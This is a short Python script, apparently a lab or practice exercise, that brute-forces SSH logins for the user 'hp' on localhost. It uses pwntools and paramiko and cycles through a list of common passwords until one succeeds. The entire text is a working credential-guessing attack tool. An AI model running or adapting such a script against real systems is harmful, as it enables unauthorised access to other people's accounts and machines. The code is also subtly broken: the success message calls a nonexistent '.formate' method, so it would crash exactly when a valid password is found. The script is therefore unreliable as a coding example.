from pwn import *
import paramiko 

host = "127.0.0.1"
username = "hp"
attempts = 0

with open("ssh-common-passwords.txt", "r") as passwords_list:
    for password in passwords_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts,password))
            response = ssh(host = host , user = username, password = password, timeout = 1)
            if response.connected():
                print("[>] Valid password found: '{}'!".formate(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1            
